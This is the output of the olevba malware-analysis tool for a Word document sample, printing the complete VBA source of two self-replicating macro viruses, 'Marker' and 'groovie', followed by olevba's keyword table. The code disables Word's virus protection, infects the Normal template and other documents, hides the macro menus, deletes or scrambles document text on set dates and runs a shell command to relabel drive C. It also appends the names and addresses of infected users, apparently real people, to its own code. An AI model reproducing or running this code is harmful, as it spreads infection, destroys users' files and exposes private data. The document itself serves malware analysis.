olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-cf6d4250f64e83af4552cab8bbdd4d12de3bb801
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-cf6d4250f64e83af4552cab8bbdd4d12de3bb801 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next I

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
            NT.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

            AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
            AD.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub

Private Sub Document_Open()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next I

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
            NT.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

            AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
            AD.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub
' 02:01:14 PM - Sunday, 16 May 1999
' USER5
'



' 10:14:21 AM - Monday, 17 May 1999
' Neelam Darne
'



' 07:14:45 PM - Wednesday, 2 Jun 1999
' Mitesh Sanghani
'



' 04:00:44 PM - Saturday, 5 Jun 1999
' xxx
'



' 04:56:42 PM - Monday, 28 Jun 1999
' Vijay
'



' 01:17:02 PM - Thursday, 1 Jul 1999
' ASIT
'



' 09:11:57 PM - Monday, 12 Jul 1999
' nics
' jtjeetjetuet
' ttjiotiotto
' erltjktjkrt



' 10:15:48 PM - Friday, 23 Jul 1999
' ss
'



' 09:31:18 AM - Wednesday, 4 Aug 1999
' GOKHALE MADHUKAR HARI
'



' 10:30:39 AM - Tuesday, 7 Sep 1999
' ss
'



' 11:09:23 AM - Tuesday, 28 Sep 1999
' maruti
'



' 10:13:53 PM - Friday, 8 Oct 1999
' hrishi
'



' 08:57:48 PM - Thursday, 9 Mar 2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 06:56:37 PM - Tuesday, 11 Apr 2000
' Jyoti
'



' 10:45:42 AM - Thursday, 5 Oct 2000
' desaiec
'



-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Marker.fq2-cf6d4250f64e83af4552cab8bbdd4d12de3bb801 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
Public I02 As Boolean
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
Public I03 As Boolean
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
Public I04 As Boolean
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
Public I05 As Boolean
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
Public I06 As String
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
Public I07 As Boolean
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
Public I08 As Boolean
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
Function I09()
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
    If MacroContainer = NormalTemplate Then
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
        I01 = "normal"
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
        GoTo checkout
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
    End If
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
checkout:
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
End Function
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
Function I10()
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then I04 = True
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
    Next I
 ' d11/4/00 3:43:41 PM609desaiec609WinFax on LPT1:
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then I03 = True
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    Next I
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Function
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Function I11()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I09
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I10
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I01 = "document" Then Call I12
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I01 = "normal" Then Call I13
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I01 = "orbit" Then Call I14
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Function
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Function I12()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I03 = False And I05 = False Then
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        With NormalTemplate.VBProject
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    End If
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I02 = False Then
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        Shell ("label c: groovie"), 0
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        Windows(1).Close
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    End If
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Function
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Function I13()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Application.ScreenUpdating = False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    Call I17
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I04 = False And I07 = True Then
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        With ActiveDocument.VBProject
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            .Execute
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    End If
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I02 = False And I07 = True Then
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    End If
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If I02 = False And I07 = False Then
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    End If
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Application.ScreenUpdating = True
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Function
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Function I14()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Application.ScreenUpdating = False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        If I03 = False And I05 = False Then
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            With NormalTemplate.VBProject
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            NormalTemplate.Save
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        End If
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        If I04 = False Then
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            With ActiveDocument.VBProject
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
                .Execute
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
            End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        End If
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Application.ScreenUpdating = True
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Function
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Function I15()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    Options.VirusProtection = False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    Options.SaveNormalPrompt = False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    Options.ConfirmConversions = False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    I06 = ActiveDocument.FullName
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    Call I11
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Function
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub AutoOpen()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I15
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub AutoClose()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
I08 = True
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I15
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub AutoExit()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I15
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub FileSaveAs()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I16
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I15
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub filesave()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I16
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I15
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub fileclose()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
I08 = True
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I15
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
ActiveDocument.Close
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub fileprint()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error Resume Next
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Call I15
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub ViewVBCode()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub ToolsMacro()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Sub FileTemplates()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Sub
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Function I17()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
On Error GoTo docek
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    If ActiveDocument.Name <> "" Then
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
        I07 = True
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    End If
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    GoTo over
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
docek:
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
    I07 = False
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
over:
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Function
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Function I16()
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Randomize
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
rn = Int(Rnd * 999)
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
For x = 2 To 358 Step 2
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
.DeleteLines x
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
Next x
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End With
 ' d11/4/00 3:43:42 PM609desaiec609WinFax on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

